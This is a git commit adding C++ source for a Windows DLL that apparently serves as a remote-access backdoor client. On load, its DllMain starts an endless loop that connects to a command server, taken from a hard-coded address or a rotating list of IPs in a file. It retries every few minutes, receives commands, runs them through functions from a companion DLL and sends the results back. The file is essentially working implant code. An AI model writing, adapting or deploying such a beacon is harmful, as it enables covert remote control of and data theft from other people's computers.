2b76eba9def3f9f8e90521ca6a485cef5c60b4f4
oldnumber18 <117345554+oldnumber18@users.noreply.github.com>
2024-09-20 21:23:14 +0800

    Add files via upload

---
+++ DLL/Client/D_Server/dllmain.cpp
@@ -0,0 +1,97 @@
+﻿// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include "pch.h"
+#define DEBUG
+int ClientDLL() {
+    HMODULE hModule = LoadLibrary(TEXT("A:\\Project\\c\\DLL\\D_API\\x64\\Release\\D_API.dll")); 
+    typedef vector<char*>*(*ParseCommand_Function)(char* Type, char* Command, char* Parametric);
+    typedef BOOL(*FreeVectorArray_Function)();
+    ParseCommand_Function ParseCommand = (ParseCommand_Function)GetProcAddress(hModule, "ParseCommand");
+    FreeVectorArray_Function FreeVectorArray = (FreeVectorArray_Function)GetProcAddress(hModule, "FreeVectorArray");
+    while (1) {
+        NewStart:
+        WSAData wsaData;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 0;
+        SOCKET TCP_Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (TCP_Client == INVALID_SOCKET) return 0;
+        SAVE_FILE SaveFile;
+        sockaddr_in addrServ;
+        addrServ.sin_family = AF_INET;
+        addrServ.sin_port = htons(IP_PORT);
+        addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
+        FILE* ClientIP_FILE = fopen("IP.txt", "r");
+        while ((connect(TCP_Client, (LPSOCKADDR)&addrServ, sizeof(addrServ))) == SOCKET_ERROR) {
+            if (ClientIP_FILE != NULL) {
+                char IP[50] = { 0 };
+                if (fgets(IP, 50, ClientIP_FILE) == NULL) {
+                    fseek(ClientIP_FILE, 0, SEEK_SET);
+                    addrServ.sin_addr.S_un.S_addr = inet_addr(IP_ADDR);
+                    continue;
+                }
+                addrServ.sin_addr.S_un.S_addr = inet_addr(IP);
+            }
+#ifndef DEBUG
+            Sleep(240000);// 4min
+#else
+            Sleep(5000);// 5s
+#endif
+        }
+        if (ClientIP_FILE != nullptr) {
+            fclose(ClientIP_FILE);
+            delete ClientIP_FILE;
+        }
+        char RecvInfo[DATA_BUFMAX] = { 0 };
+        SERVER SendInfoStructure;
+        vector<char*>* SendInfoArray;
+        while (1) {
+            if (recv(TCP_Client, RecvInfo, DATA_BUFMAX, 0) == SOCKET_ERROR) {
+                break;// 目的:重新连接
+            }
+            SERVER* GetInfoStructure = (SERVER*)&RecvInfo;// 解析
+            // 填写信息  
+            strcpy(SendInfoStructure.Type, "I");
+            strcpy(SendInfoStructure.ID.Name, GetInfoStructure->ID.Name);
+            SendInfoStructure.ID.Num = GetInfoStructure->ID.Num;
+            // 判断内容
+            if ((!strcmp(GetInfoStructure->Type, "C")) && (!strcmp(GetInfoStructure->Info, "Exit"))) {
+                break;
+            }
+            if (ParseCommand == NULL || FreeVectorArray == NULL) {
+                strcpy(SendInfoStructure.Info, "查找不到DLL函数。");
+                SendInfoStructure.Size = strlen(SendInfoStructure.Info);
+                if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) goto NewStart;
+            }
+            else {
+                SendInfoArray = ParseCommand(GetInfoStructure->Type, GetInfoStructure->Command, GetInfoStructure->Info);
+                for (int i = 0; i < SendInfoArray->size(); i++) {
+                    strcpy(SendInfoStructure.Info, SendInfoArray->at(i));
+                    SendInfoStructure.Size = strlen(SendInfoArray->at(i));
+                    if (send(TCP_Client, (char*)&SendInfoStructure, DATA_BUFMAX, 0) == SOCKET_ERROR) {
+                        FreeVectorArray();
+                        goto NewStart;
+                    }
+                }
+                FreeVectorArray();
+            }
+        }
+        closesocket(TCP_Client);
+        WSACleanup();
+    }
+}
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        ClientDLL();
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
---
+++ DLL/Client/D_Server/framework.h
@@ -0,0 +1,39 @@
+﻿#pragma once
+
+#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
+#pragma warning(disable:4996)
+#pragma warning(disable:4101)
+// Windows 头文件
+#include <windows.h>
+#include <winSock2.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <vector>
+using namespace std;
+#define DATA_BUFMAX 2048
+#define DATA_BUFMIN 45
+#define DATA_BUFMID 2000
+#define IP_PORT 9999
+#define IP_ADDR "127.0.0.1"
+#pragma comment(lib,"ws2_32.lib")
+extern "C" {
+    __declspec(dllexport) int ClientDLL();
+}
+// 发送到服务器结构
+typedef struct _WHO {
+    int Num;
+    char Name[20];
+}IDINFO;
+typedef struct _SERVER {
+    IDINFO ID;// 接收:谁发生过来的信息 发送:发送给谁？-->信息反馈目标
+    int Size;// 消息大小，在 Command 的消息为 FileInfo 时，为文件大小
+    char Type[2];// 发送的类型 第一次区分指令
+    char Command[10];// 第二次区分指令
+    char Info[DATA_BUFMID];// 要发送的内容
+}SERVER;
+typedef struct _FILE {
+    FILE* fp;
+    int FileSize;// 总大小
+    int GetSize;// 得到的大小
+    char name[200];
+}SAVE_FILE;
